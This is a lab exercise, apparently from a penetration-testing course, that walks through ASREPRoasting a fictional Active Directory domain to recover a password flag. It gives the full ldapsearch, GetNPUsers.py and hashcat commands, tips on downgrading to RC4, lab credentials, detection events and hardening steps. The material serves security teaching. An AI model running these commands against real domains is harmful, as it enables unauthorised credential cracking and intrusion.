    Exercise 3.2: ASREPRoast

    Before You Begin

    Pre-authentication is the timestamp the client encrypts with its password-derived key inside an AS-REQ. The KDC verifies the timestamp before issuing an AS-REP. The check stops an attacker from blind-fetching crackable AS-REPs for arbitrary users. Disable pre-auth on a user (the DONT_REQ_PREAUTH flag in userAccountControl) and the KDC happily issues AS-REPs without any check; the encrypted enc-part is then crackable offline because it is encrypted with a derivation of the user's password.

    Exercise 3.2 asks you to find one such user in Nordport's directory and crack their AS-REP. The recovered password is your flag.

    Tools required: impacket-GetNPUsers (often GetNPUsers.py), hashcat, ldapsearch. All pre-installed on Kali.

    Scenario

    Marcus Bell: "Pre-auth is on by default. When it is off, the KDC will hand out an encrypted blob to anyone who asks. Engineering has a service account from 2019 that still has it disabled. The blob is encrypted with the account's key. If the password is weak, you crack it offline."

    The target account is svc_legacy_<token>. The password you crack is the flag.

    Credentials:

    Username Password Use
    j.chen Welcome2026# LDAP enumeration only (the AS-REP attack itself is unauthenticated)

    Domain: corp.nordport.local

    Your Objectives

    • Find every user with DONT_REQ_PREAUTH set
    • Identify your scope-token account
    • Request its AS-REP without authentication
    • Crack the AS-REP with hashcat mode 18200
    • Submit the recovered plaintext

    Etype Choice Drives Crack Speed

    Three encryption types appear in the wild. The table below tells you which hashcat mode to launch and how aggressively to expect a crack.

    Etype Algorithm Hash prefix Hashcat mode Relative crack speed
    23 RC4-HMAC $krb5asrep$23$ 18200 fastest (often 2-10x AES)
    17 AES128 $krb5asrep$17$ 18201 medium
    18 AES256 $krb5asrep$18$ 18202 slowest

    Background: Why DONT_REQ_PREAUTH Exists and Why It Survives

    When Kerberos was added to Windows 2000, some legacy applications and downlevel clients did not implement the timestamp-encrypted pre-authentication step in the AS-REQ. To support those clients, Microsoft kept a per-user flag (DONT_REQ_PREAUTH, 0x400000) in the userAccountControl bitmask that disables the timestamp requirement. The KDC, seeing the flag, returns an AS-REP without checking the timestamp first.

    Modern protocols universally support pre-authentication. The flag survives in production because:

    1. A legacy integration once required it and was never re-tested after the integration was deprecated
    2. An operator set it temporarily ("just to get the script working") and forgot to revert
    3. A migration from a 2003-era domain preserved the flag set on accounts that used to need it
    4. A naive scripted account creation routine used a UAC value template that included the flag

    Defenders find these accounts with one LDAP query (below). Attackers find them with the same query and add GetNPUsers.py. The audit-side fix is a one-line Set-ADAccountControl; the discoverable-with-one-LDAP-query nature of the flag is why it is so reliably hit on internal pentests.

    The LDAP filter

    (&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))

    Decoding: - objectCategory=person, objectClass=user: limit to user accounts - userAccountControl:1.2.840.113556.1.4.803:=4194304: bitwise AND match (OID 1.2.840.113556.1.4.803) of the UAC field against 0x400000 (decimal 4194304)

    The OID is LDAP_MATCHING_RULE_BIT_AND. Every LDAP search against UAC flags uses one of: 1.2.840.113556.1.4.803 (AND) or 1.2.840.113556.1.4.804 (OR).

    The AS-REP hash format

    GetNPUsers.py returns hashes formatted for hashcat:

    $krb5asrep$23$svc_legacy_a7f3@CORP.NORDPORT.LOCAL:<server_challenge>$<encrypted_blob>

    23 is the encryption type (RC4-HMAC). Hashcat mode is 18200.

    Tool Primer

    LDAP query for AS-REP-roastable users

    Authenticated:

    ldapsearch -x -LLL -H ldap://<dc> \
  -D "CORP\j.chen" -w 'Welcome2026#' \
  -b "DC=corp,DC=nordport,DC=local" \
  "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" \
  sAMAccountName

    Unauthenticated alternative (if anonymous LDAP is enabled, see Exercise 2.1):

    ldapsearch -x -LLL -H ldap://<dc> \
  -b "DC=corp,DC=nordport,DC=local" \
  "(&(objectCategory=person)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" \
  sAMAccountName

    GetNPUsers.py

    GetNPUsers.py corp.nordport.local/ -no-pass -usersfile users.txt -dc-ip <dc> -outputfile asrep.hash

    Or attack a specific user without a list:

    GetNPUsers.py corp.nordport.local/svc_legacy_<token> -no-pass -dc-ip <dc>

    -no-pass tells impacket to skip the pre-auth attempt. -usersfile is a one-username-per-line file. -outputfile writes the hash directly to a file in hashcat format.

    hashcat mode 18200

    hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule

    Walkthrough

    Step 1: Find AS-REP-roastable Accounts

    The first step is discovery. The bitwise LDAP filter compares each user's userAccountControl against 0x400000 (decimal 4194304) and returns only the users with that bit set. Running it as j.chen rather than anonymously is faster (no anonymous-bind handshake) and works regardless of whether the domain allows anonymous LDAP.

    Kali - Pull every user with DONT_REQ_PREAUTH

    ldapsearch -x -LLL -H ldap://<dc_ip> \
  -D "CORP\j.chen" -w 'Welcome2026#' \
  -b "DC=corp,DC=nordport,DC=local" \
  "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" \
  sAMAccountName \
  | grep sAMAccountName
    Token Effect
    (&(...)(...)) LDAP AND of multiple sub-filters.
    objectCategory=person Restrict to user objects (excludes computers and security groups).
    objectClass=user Belt-and-suspenders user-class filter.
    userAccountControl:1.2.840.113556.1.4.803:=4194304 Bitwise-AND match against the UAC field; 4194304 = 0x400000 = DONT_REQ_PREAUTH.
    sAMAccountName Only return this single attribute; less data over the wire.
    \| grep sAMAccountName Filter the LDIF output to just the username lines.

    Each line shows a candidate. Yours is svc_legacy_<token>. Other students' candidates also appear; ignore them.

    Step 2: Build a Users File

    GetNPUsers.py accepts either a single username on the command line or a list file via -usersfile. Even with one user, the file form is what you would use in the real world (you would feed an enumerated list of every domain user) so we follow the same pattern.

    Kali - Save the candidate list

    mkdir -p ~/work/adpt-3-02 && cd ~/work/adpt-3-02
echo "svc_legacy_${OCR_SCOPE_TOKEN}" > users.txt

    Verify the file contains your token: cat users.txt. If it shows svc_legacy_ with no suffix, the variable was empty; re-source your shell or check Step 1 of any prior chapter for the echo $OCR_SCOPE_TOKEN confirmation.

    Step 3: Request the AS-REP

    GetNPUsers.py is part of the impacket suite. With -no-pass it sends an AS-REQ without the pA-ENC-TIMESTAMP field; the KDC checks each requested user's UAC. Users with pre-auth required produce KDC_ERR_PREAUTH_REQUIRED (impacket prints [-]). Users with pre-auth disabled produce a usable AS-REP that impacket formats as a hashcat-ready string.

    Kali - GetNPUsers without authentication

    GetNPUsers.py corp.nordport.local/ -no-pass -usersfile users.txt \
  -dc-ip <dc_ip> -outputfile asrep.hash
cat asrep.hash
    Flag Effect
    <realm>/ Domain realm with trailing slash and no user; "list mode".
    -no-pass Skip the pre-auth attempt; just send the AS-REQ.
    -usersfile users.txt One username per line, queried in turn.
    -dc-ip <ip> Skip DNS for the KDC; talk to the IP directly.
    -outputfile asrep.hash Write hashcat-formatted hashes to file.

    The file should contain one line in $krb5asrep$23$svc_legacy_<token>@CORP.NORDPORT.LOCAL:...$... format. The 23 after $krb5asrep$ is the encryption type (RC4-HMAC); if it shows 17 or 18 you got AES and need hashcat mode 18201 or 18202 in Step 4.

    Step 4: Crack with hashcat

    Mode 18200 understands the $krb5asrep$23$ format. Hashcat hashes each candidate password with RC4-HMAC, computes the expected response, and compares to the captured hash. The seeded password is in rockyou.txt; best64.rule covers the typical mutations (number suffix, case toggle, leetspeak).

    Kali - Crack the AS-REP

    hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule
    Flag Effect
    -m 18200 Net-Kerberos AS-REP RC4. Switch to 18201/18202 for AES.
    <hash_file> First positional.
    <wordlist> Second positional.
    -r <rule> Apply mutations from the rule file.

    On modest hardware the seeded password cracks within minutes. When done:

    hashcat -m 18200 asrep.hash --show

    The trailing field after the colon is the plaintext.

    Step 5: Submit the Plaintext

    The plaintext IS the flag for this exercise. Wrap the recovered plaintext in OCR{...} and submit, so a recovered plaintext of <plaintext> becomes OCR{<plaintext>}.

    Common gotchas

    • etype mismatch: if the captured hash starts with $krb5asrep$17$ or $krb5asrep$18$, mode 18200 returns "no hashes loaded". Re-run with -m 18201 (AES128) or -m 18202 (AES256).
    • Realm casing: impacket is strict about realm form. CORP.NORDPORT.LOCAL/ (uppercase) is canonical; lowercase typically works but inconsistent casing breaks some impacket versions.
    • DC clock skew: Kerberos rejects timestamps more than 5 minutes off. chronyc tracking should show the Kali clock within 60 seconds of the DC. If skew is large, sudo ntpdate <dc_ip> first.
    • No candidates returned: the LDAP filter requires authentication to read UAC on most domains. If anonymous bind is disabled, you must have at least one valid credential to enumerate. j.chen suffices.

    Blue Team Perspective

    ASREPRoast is detectable on the DC the moment it happens. The detection is one event ID, two filters, and a SIEM rule.

    Activity Event ID Field giveaway
    AS-REP issued without preauth 4768 Pre-Authentication Type = 0
    Account flagged with DONT_REQ_PREAUTH 4738 userAccountControl includes 0x400000
    Bulk AS-REQ enumeration 4768 burst from one IP Source IP rate spike
    ASREP detection (MDI) "Suspicious Kerberos AS-REP" Defender for Identity

    What detection looks like

    A normal environment generates approximately zero 4768 events with Pre-Authentication Type = 0 in any 24-hour window. Any non-zero count from a single source IP is high-confidence enumeration. SIEM rule: alert when Event ID = 4768 AND Pre-Authentication Type = 0. The cardinality is low enough to investigate every hit.

    Hardening Note

    The vulnerability lives entirely in one bit on one attribute on a small number of accounts. Audit and fix.

    ASREPRoast hardening

    • Run an LDAP audit query weekly: (userAccountControl:1.2.840.113556.1.4.803:=4194304). Any result is a finding.
    • Clear the DONT_REQ_PREAUTH bit on every account: Set-ADAccountControl -Identity <user> -DoesNotRequirePreAuth $false.
    • Disable RC4 forest-wide via GPO Network security: Configure encryption types allowed for Kerberos = AES128, AES256. Forces AES, drastically slows offline cracking.
    • Move service accounts to gMSAs so the password is auto-rotated and far too long to crack.
    • Build SIEM detection: 4768 with Pre-Authentication Type = 0 from any source IP. Alert on any hit.

    Analysis Questions

    1. Why is the AS-REP enc-part encrypted with the user's key rather than the krbtgt key, given that the AS-REP is supposed to issue a TGT?

    Reveal Answer

    The AS-REP carries two encrypted blobs. The TGT body (inside ticket.enc-part) is encrypted with krbtgt's key so only KDCs can read it. The enc-part (outside the ticket, at the message level) contains the session key, ticket lifetime, and other client-needed metadata; it is encrypted with the user's key so the legitimate user can decrypt it and learn the session key. The user must learn the session key to use the TGT for subsequent TGS-REQs. ASREPRoast attacks the message-level enc-part, not the TGT body. Cracking the enc-part yields the user's password but does not yield the TGT contents (which would be a much more powerful attack; and is the krbtgt-key forgery known as a golden ticket).

    2. The encryption type in the AS-REP can be RC4-HMAC, AES128, or AES256. RC4 is 18200; AES variants are 18201, 18202. What controls which encryption type the KDC uses, and how can an attacker influence it?

    Reveal Answer

    The encryption type the KDC uses for the AS-REP is determined by the user's msDS-SupportedEncryptionTypes attribute (or, if not set, the domain default), intersected with the encryption types the client says it supports in the AS-REQ etype field. An attacker can request RC4-HMAC explicitly by setting the etype to arcfour-hmac only, which downgrades the response to RC4 if the user's account allows it. RC4 is the most desirable target for cracking because it is significantly faster to compute than AES, often by 2-10x. Modern AD environments disable RC4 globally via the Network security: Configure encryption types allowed for Kerberos GPO setting; when RC4 is disabled, the AS-REP comes back AES-encrypted (18201/18202) and cracking is slower but still possible. Always check the etype field of the captured hash before queuing a long-running crack job.

    3. ASREPRoast does not produce any KDC error, only a successful AS-REP. From a defender's perspective, how do you detect an attack?

    Reveal Answer

    The defender's primary signal is anomalous volume of AS-REQs without pre-auth from a single source IP, especially against accounts that should never authenticate without pre-auth. Event ID 4768 (Kerberos TGT request) is the data source; filter for Pre-Authentication Type = 0 and group by source IP. A normal environment has near-zero such events; a single source generating dozens per minute is an active enumeration attempt. The secondary signal is creation or modification of the DONT_REQ_PREAUTH flag on any account: event 4738 (user account changed) with userAccountControl containing 0x400000. Both signals are easy to put into a SIEM rule. The hardening control is to ensure no production account has the flag set; run a weekly LDAP query for (userAccountControl:1.2.840.113556.1.4.803:=4194304) and treat any result as a finding.

    Key Takeaways

    • DONT_REQ_PREAUTH (0x400000) makes a user's AS-REP issuable without pre-auth.
    • The AS-REP enc-part is encrypted with the user's key and crackable offline.
    • Hashcat mode 18200 (RC4) or 18201/18202 (AES variants) cracks the captured hash.
    • The LDAP filter (userAccountControl:1.2.840.113556.1.4.803:=4194304) finds candidates in one query.
    • Defenders detect via 4768 events with Pre-Auth Type = 0 and per-source rate spikes.

    Spaced Repetition

    Card 1: AS-REP Hash Mode

    Q: What hashcat mode cracks an $krb5asrep$23$ hash, and what does the 23 mean?

    Answer

    Mode 18200. The 23 is the Kerberos encryption type for RC4-HMAC. AES128 is type 17 (mode 18201), AES256 is type 18 (mode 18202). The numeric type maps to RFC 3961 algorithm identifiers; 23 for ARCFOUR-HMAC is historically labeled arcfour-hmac-md5.

    Card 2: GetNPUsers Without Credentials

    Q: Write the GetNPUsers.py command to request AS-REPs for users listed in users.txt against corp.local at DC 10.10.10.10, with no authentication, writing output to asrep.hash.

    Answer 
    GetNPUsers.py corp.local/ -no-pass -usersfile users.txt \
  -dc-ip 10.10.10.10 -outputfile asrep.hash

    -no-pass skips the pre-auth attempt. The trailing / after the realm and before nothing else means "no specific user, list mode". To target one user: GetNPUsers.py corp.local/userone -no-pass -dc-ip 10.10.10.10.

    Card 3: LDAP Filter for Pre-Auth Disabled

    Q: Write the LDAP filter that returns all users with DONT_REQ_PREAUTH set.

    Answer 
    (&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))

    OID 1.2.840.113556.1.4.803 is LDAP_MATCHING_RULE_BIT_AND. The decimal 4194304 is 0x400000, the DONT_REQ_PREAUTH bit. Use 1.2.840.113556.1.4.804 for OR matching.

    Card 4: Defender Detection Signal

    Q: What event ID and field combination indicates an in-progress ASREPRoast?

    Answer

    Windows event 4768 (Kerberos TGT request) with Pre-Authentication Type = 0. A normal environment has near-zero such events; a sudden cluster from one source IP is the signal. Add a SIEM rule: more than 5 such events in 60 seconds from a single source IP. The hardening control is ensuring no production user has DONT_REQ_PREAUTH set; weekly LDAP audit will catch creeping misconfigurations.

    Card 5: AS-REP Encryption Etype Control

    Q: Why might an attacker explicitly request RC4-HMAC (etype 23) from the KDC, and how is that done?

    Answer

    RC4-HMAC cracks 2-10x faster than AES variants on the same hardware. An attacker requests it by setting the etype field of the AS-REQ to arcfour-hmac only. The KDC honors the request if the user's msDS-SupportedEncryptionTypes permits RC4. Modern environments disable RC4 globally via Network security: Configure encryption types allowed for Kerberos, which forces AES and slows cracking. Check the captured hash format: $krb5asrep$23$ is RC4, $krb5asrep$17$ is AES128, $krb5asrep$18$ is AES256.
